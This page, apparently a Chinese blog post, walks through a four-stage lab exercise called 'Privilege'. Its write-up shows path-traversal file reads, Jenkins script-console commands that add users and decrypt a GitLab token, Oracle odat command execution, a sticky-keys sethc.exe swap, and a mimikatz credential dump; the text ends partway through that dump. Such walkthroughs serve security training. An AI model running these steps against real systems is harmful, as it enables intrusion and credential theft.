@@ -1,0 +1,417 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>春秋云镜privilege-wp | P4tt0n's b10g</title><meta name="author" content="P4tt0n"><meta name="copyright" content="P4tt0n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Privilege开题 39.98.112.69 第一关.&#x2F;fscan -h 39.98.112.69 -p 1-65535 tools&#x2F;content-log.php存在任意文件读取 &lt;?php$logfile &#x3D; rawurldecode( $_GET[&#x27;logfile&#x27;] );&#x2F;&#x2F; Make sure the file is exist.if ( file">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜privilege-wp">
+<meta property="og:url" content="https://p4tt0n.github.io/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cprivilege-wp/index.html">
+<meta property="og:site_name" content="P4tt0n&#39;s b10g">
+<meta property="og:description" content="Privilege开题 39.98.112.69 第一关.&#x2F;fscan -h 39.98.112.69 -p 1-65535 tools&#x2F;content-log.php存在任意文件读取 &lt;?php$logfile &#x3D; rawurldecode( $_GET[&#x27;logfile&#x27;] );&#x2F;&#x2F; Make sure the file is exist.if ( file">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg">
+<meta property="article:published_time" content="2025-03-02T10:50:47.000Z">
+<meta property="article:modified_time" content="2025-03-02T11:10:19.772Z">
+<meta property="article:author" content="P4tt0n">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg"><link rel="shortcut icon" href="https://pic.imge.cc/2024/08/01/66ab32dd0cc03.png"><link rel="canonical" href="https://p4tt0n.github.io/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cprivilege-wp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.14.0-b3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>(()=>{
+      const saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+      
+      window.btf = {
+        saveToLocal: saveToLocal,
+        getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+          script.src = url
+          script.async = true
+          script.onerror = reject
+          script.onload = script.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            script.onload = script.onreadystatechange = null
+            resolve()
+          }
+
+          Object.keys(attr).forEach(key => {
+            script.setAttribute(key, attr[key])
+          })
+
+          document.head.appendChild(script)
+        }),
+
+        getCSS: (url, id = false) => new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+          link.rel = 'stylesheet'
+          link.href = url
+          if (id) link.id = id
+          link.onerror = reject
+          link.onload = link.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            link.onload = link.onreadystatechange = null
+            resolve()
+          }
+          document.head.appendChild(link)
+        }),
+
+        addGlobalFn: (key, fn, name = false, parent = window) => {
+          const pjaxEnable = false
+          if (!pjaxEnable && key.startsWith('pjax')) return
+
+          const globalFn = parent.globalFn || {}
+          const keyObj = globalFn[key] || {}
+    
+          if (name && keyObj[name]) return
+    
+          name = name || Object.keys(keyObj).length
+          keyObj[name] = fn
+          globalFn[key] = keyObj
+          parent.globalFn = globalFn
+        }
+      }
+    
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+      
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })()</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '春秋云镜privilege-wp',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-03-02 19:10:19'
+}</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="./themes/butterfly/source/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', () => { preloader.initLoading() }, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', () => { preloader.endLoading() }, 'preloader_end')
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic2.zhimg.com/32098d0cc61d44d6151fb7614211d256_r.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="P4tt0n's b10g"><img class="site-icon" src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" alt="Logo"/><span class="site-name">P4tt0n's b10g</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">春秋云镜privilege-wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-02T10:50:47.000Z" title="发表于 2025-03-02 18:50:47">2025-03-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-02T11:10:19.772Z" title="更新于 2025-03-02 19:10:19">2025-03-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>30分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="春秋云镜privilege-wp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Privilege"><a href="#Privilege" class="headerlink" title="Privilege"></a>Privilege</h1><p>开题 39.98.112.69</p>
+<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p><code>./fscan -h 39.98.112.69 -p 1-65535</code></p>
+<p>tools&#x2F;content-log.php存在任意文件读取</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$logfile</span> = <span class="title function_ invoke__">rawurldecode</span>( <span class="variable">$_GET</span>[<span class="string">&#x27;logfile&#x27;</span>] );</span><br><span class="line"><span class="comment">// Make sure the file is exist.</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">file_exists</span>( <span class="variable">$logfile</span> ) ) &#123;</span><br><span class="line">  <span class="comment">// Get the content and echo it.</span></span><br><span class="line">  <span class="variable">$text</span> = <span class="title function_ invoke__">file_get_contents</span>( <span class="variable">$logfile</span> );</span><br><span class="line">  <span class="keyword">echo</span>( <span class="variable">$text</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>利用漏洞读取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tools/content-log.php?logfile=../../../../../../../../../../../users/administrator/flag/flag01.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302125942305.png" alt="image-20250302125942305"></p>
+<blockquote>
+<p>关卡1：请获取 XR Shop 官网源码的备份文件，并尝试获得系统上任意文件读取的能力。并且，管理员在配置 Jenkins 时，仍然选择了使用初始管理员密码，请尝试读取该密码并获取 Jenkins 服务器权限。Jenkins 配置目录为 C:\ProgramData\Jenkins.jenkins。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tools/content-log.php?logfile=../../../../../../../../../ProgramData/Jenkins/.jenkins/secrets/initialAdminPassword</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302130148551.png" alt="image-20250302130148551"></p>
+<p>账号密码  admin&#x2F;510235cf43f14e83b88a9f144199655b 登陆后台</p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302130249988.png" alt="image-20250302130249988"></p>
+<p>在<code>/script/</code>目录执行脚本</p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302130556728.png" alt="image-20250302130556728"></p>
+<p>groovy脚本增加用户</p>
+<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">println <span class="string">&quot;net user Tsuki pass@123 /add&quot;</span>.execute().text</span><br><span class="line">println <span class="string">&quot;net localgroup administrators Tsuki /add&quot;</span>.execute().text</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302130631355.png" alt="image-20250302130631355"></p>
+<p>rdp连接</p>
+<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><blockquote>
+<p>管理员为 Jenkins 配置了 Gitlab，请尝试获取 Gitlab API Token，并最终获取 Gitlab 中的敏感仓库。获取敏感信息后，尝试连接至 Oracle 数据库，并获取 ORACLE 服务器控制权限。</p>
+</blockquote>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302131551803.png" alt="image-20250302131551803"></p>
+<p>扫内网，搭代理</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">172.22.14.7:445 open</span><br><span class="line">172.22.14.7:8080 open</span><br><span class="line">172.22.14.31:1521 open</span><br><span class="line">172.22.14.7:3306 open</span><br><span class="line">172.22.14.46:445 open</span><br><span class="line">172.22.14.31:445 open</span><br><span class="line">172.22.14.11:445 open</span><br><span class="line">172.22.14.46:139 open</span><br><span class="line">172.22.14.31:139 open</span><br><span class="line">172.22.14.11:139 open</span><br><span class="line">172.22.14.7:139 open</span><br><span class="line">172.22.14.46:135 open</span><br><span class="line">172.22.14.31:135 open</span><br><span class="line">172.22.14.11:135 open</span><br><span class="line">172.22.14.7:135 open</span><br><span class="line">172.22.14.46:80 open</span><br><span class="line">172.22.14.16:80 open</span><br><span class="line">172.22.14.7:80 open</span><br><span class="line">172.22.14.16:22 open</span><br><span class="line">172.22.14.16:8060 open</span><br><span class="line">172.22.14.11:88 open</span><br><span class="line">172.22.14.16:9094 open</span><br><span class="line">[*] alive ports len is: 22</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://172.22.14.7:8080   code:403 len:548    title:None</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]172.22.14.31</span><br><span class="line">   [-&gt;]XR-ORACLE</span><br><span class="line">   [-&gt;]172.22.14.31</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]172.22.14.11</span><br><span class="line">   [-&gt;]XR-DC</span><br><span class="line">   [-&gt;]172.22.14.11</span><br><span class="line">[*] NetBios 172.22.14.46    XIAORANG\XR-0923</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]172.22.14.7</span><br><span class="line">   [-&gt;]XR-JENKINS</span><br><span class="line">   [-&gt;]172.22.14.7</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]172.22.14.46</span><br><span class="line">   [-&gt;]XR-0923</span><br><span class="line">   [-&gt;]172.22.14.46</span><br><span class="line">[*] NetBios 172.22.14.11    [+] DC:XIAORANG\XR-DC</span><br><span class="line">[*] WebTitle http://172.22.14.46       code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] WebTitle http://172.22.14.16:8060  code:404 len:555    title:404 Not Found</span><br><span class="line">[*] NetBios 172.22.14.31    WORKGROUP\XR-ORACLE</span><br><span class="line">[*] WebTitle http://172.22.14.16       code:302 len:99     title:None 跳转url: http://172.22.14.16/users/sign_in</span><br><span class="line">[*] WebTitle http://172.22.14.7        code:200 len:54603  title:XR SHOP</span><br><span class="line">[*] WebTitle http://172.22.14.16/users/sign_in code:200 len:34961  title:Sign in · GitLab</span><br><span class="line">[+] PocScan http://172.22.14.7/www.zip poc-yaml-backup-file</span><br></pre></td></tr></table></figure>
+
+
+
+<table>
+<thead>
+<tr>
+<th>内网地址</th>
+<th>Host or FQDN</th>
+<th>简要描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>172.22.14.7</td>
+<td>XR-JENKINS</td>
+<td>WordPress 服务（80 端口）、jenkins 服务（8080 端口）</td>
+</tr>
+<tr>
+<td>172.22.14.16</td>
+<td>gitlab.xiaorang.lab</td>
+<td>gitlab 服务器</td>
+</tr>
+<tr>
+<td>172.22.14.31</td>
+<td>XR-ORACLE</td>
+<td>oracle 数据库服务器</td>
+</tr>
+<tr>
+<td>172.22.14.46</td>
+<td>XR-0923.xiaorang.lab</td>
+<td>内网 PC 机</td>
+</tr>
+<tr>
+<td>172.22.14.11</td>
+<td>XR-DC.xiaorang.lab</td>
+<td>域控</td>
+</tr>
+</tbody></table>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302132155461.png" alt="image-20250302132155461"></p>
+<p>在 <code>/manage/credentials/</code> 目录下，可以查看到该唯一标识符（apiTokenId）：</p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302132339932.png" alt="image-20250302132339932"></p>
+<p>访问 <code>/manage/credentials/store/system/domain/_/credential/9eca4a05-e058-4810-b952-bd6443e6d9a8/update</code> 地址，可以获得密文的 Gitlab API token</p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302132921102.png" alt="image-20250302132921102"></p>
+<p>回到<code>/script/</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">println(hudson.util.Secret.fromString(&quot;&#123;AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh&#125;&quot;).getPlainText())</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302133054497.png" alt="image-20250302133054497"></p>
+<p>拉取对应项目</p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302190211895.png" alt="image-20250302190211895"></p>
+<p>在xradmin中的ruoyi-admin&#x2F;src&#x2F;main&#x2F;resources&#x2F;application-druid.yml找到oracle账号密码</p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302133706999.png" alt="image-20250302133706999"></p>
+<p>internal-secret&#x2F;credentials.txt里找到XR-0923的账密</p>
+<p>XR-0923 | zhangshuai | wSbEajHzZs</p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302134750466.png" alt="image-20250302134750466"></p>
+<p>然后利用odat打oracle</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec &#x27;net user Tsuki pass@123 /add&#x27;</span><br><span class="line">proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec &#x27;net localgroup administrators Tsuki /add&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302134455567.png" alt="image-20250302134455567"></p>
+<p>rdp连31拿flag</p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302134623521.png" alt="image-20250302134623521"></p>
+<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><blockquote>
+<p>攻击办公区内网，获取办公 PC 控制权限，并通过特权滥用提升至 SYSTEM 权限。</p>
+</blockquote>
+<p>zhangshuai&#x2F;wSbEajHzZs直接RDP连上46</p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302135024987.png" alt="image-20250302135024987"></p>
+<p>权限不够</p>
+<p>查看用户组</p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302135107771.png" alt="image-20250302135107771"></p>
+<p>由于属于Remote Management Use，所以可以使用evil-winrm连接机器</p>
+<p><code>proxychains evil-winrm -i 172.22.14.46 -u zhangshuai -p wSbEajHzZs</code></p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302135224481.png" alt="image-20250302135224481"></p>
+<p>发现多了一个SeRestorePrivilege</p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302135347349.png" alt="image-20250302135347349"></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/348">奇安信攻防社区-手把手教你Windows提权</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ren C://windows/system32/sethc.exe C://windows/system32/sethc.bak</span><br><span class="line">ren C://windows/system32/cmd.exe C://windows/system32/sethc.exe</span><br></pre></td></tr></table></figure>
+
+<p>锁定用户然后连按shift</p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302135652069.png" alt="image-20250302135652069"></p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302135744841.png" alt="image-20250302135744841"></p>
+<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><blockquote>
+<p>尝试接管备份管理操作员帐户，并通过转储 NTDS 获得域管理员权限，最终控制整个域环境。</p>
+</blockquote>
+<p>创建管理员用户登录</p>
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302140209081.png" alt="image-20250302140209081"></p>
+<p>上传猕猴桃</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/30/hello-world/e-wp/image-20250302140906461.png" alt="image-20250302140906461"></p>
+<p>遇到报错,好像是版本问题</p>
+<p>换了一个欧克了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 4843546 (00000000:0049e81a)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/2 13:49:02</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 6cb8f3797fb44d3ee3a0cd55ea6ff8f1</span><br><span class="line">         * SHA1     : e9f071d7de06d0492a584daea984695504f6dd51</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : e9 54 f2 60 48 67 2e b8 3c fe e4 be 9a fe 37 55 f5 04 df 78 90 c0 3d 4e 2e 9e 9b 20 9f 0c 88 39 97 90 18 36 70 6e 98 0e cd 78 33 42 4d d7 e9 e5 af 9f 5a 9f fc fb d0 8a b9 1f af 67 b0 cf 90 bd 8c 2b e0 20 a6 f1 6c 70 fa 84 54 94 a2 47 23 b0 57 75 61 15 3f 39 a1 02 76 d3 72 eb a5 41 db e1 f0 22 44 ce fc 54 a9 75 84 e6 6c 48 fe 8a ac 84 6a 41 d1 99 1e 94 aa 70 4c 3d 56 8e dc 18 db 88 56 40 a8 cc 5d 50 61 14 c0 81 86 f1 02 14 aa 1c cd 59 3b 0e 8f 63 9a f2 40 00 65 39 95 7a 1e 40 85 a9 85 65 73 03 9e 0e 3e 99 52 fd 96 e7 17 3c 4e 93 07 77 6e 7a 56 d4 1a d4 a3 3c 3b e3 c0 41 4c 26 fe 6e 4c ad 0e f6 fa 7b d6 ad 69 c1 4e 93 38 dc 77 2a 63 f5 77 e1 0a 9a 20 88 87 7f 63 58 ac fa 1b c7 19 b1 86 71 47 8f 32 30 07 05 28 95</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 4842744 (00000000:0049e4f8)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : UMFD-2</span><br><span class="line">Domain            : Font Driver Host</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/2 13:49:02</span><br><span class="line">SID               : S-1-5-96-0-2</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 6cb8f3797fb44d3ee3a0cd55ea6ff8f1</span><br><span class="line">         * SHA1     : e9f071d7de06d0492a584daea984695504f6dd51</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : e9 54 f2 60 48 67 2e b8 3c fe e4 be 9a fe 37 55 f5 04 df 78 90 c0 3d 4e 2e 9e 9b 20 9f 0c 88 39 97 90 18 36 70 6e 98 0e cd 78 33 42 4d d7 e9 e5 af 9f 5a 9f fc fb d0 8a b9 1f af 67 b0 cf 90 bd 8c 2b e0 20 a6 f1 6c 70 fa 84 54 94 a2 47 23 b0 57 75 61 15 3f 39 a1 02 76 d3 72 eb a5 41 db e1 f0 22 44 ce fc 54 a9 75 84 e6 6c 48 fe 8a ac 84 6a 41 d1 99 1e 94 aa 70 4c 3d 56 8e dc 18 db 88 56 40 a8 cc 5d 50 61 14 c0 81 86 f1 02 14 aa 1c cd 59 3b 0e 8f 63 9a f2 40 00 65 39 95 7a 1e 40 85 a9 85 65 73 03 9e 0e 3e 99 52 fd 96 e7 17 3c 4e 93 07 77 6e 7a 56 d4 1a d4 a3 3c 3b e3 c0 41 4c 26 fe 6e 4c ad 0e f6 fa 7b d6 ad 69 c1 4e 93 38 dc 77 2a 63 f5 77 e1 0a 9a 20 88 87 7f 63 58 ac fa 1b c7 19 b1 86 71 47 8f 32 30 07 05 28 95</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 2377431 (00000000:002446d7)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : DefaultAppPool</span><br><span class="line">Domain            : IIS APPPOOL</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/2 13:16:27</span><br><span class="line">SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 6cb8f3797fb44d3ee3a0cd55ea6ff8f1</span><br><span class="line">         * SHA1     : e9f071d7de06d0492a584daea984695504f6dd51</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">        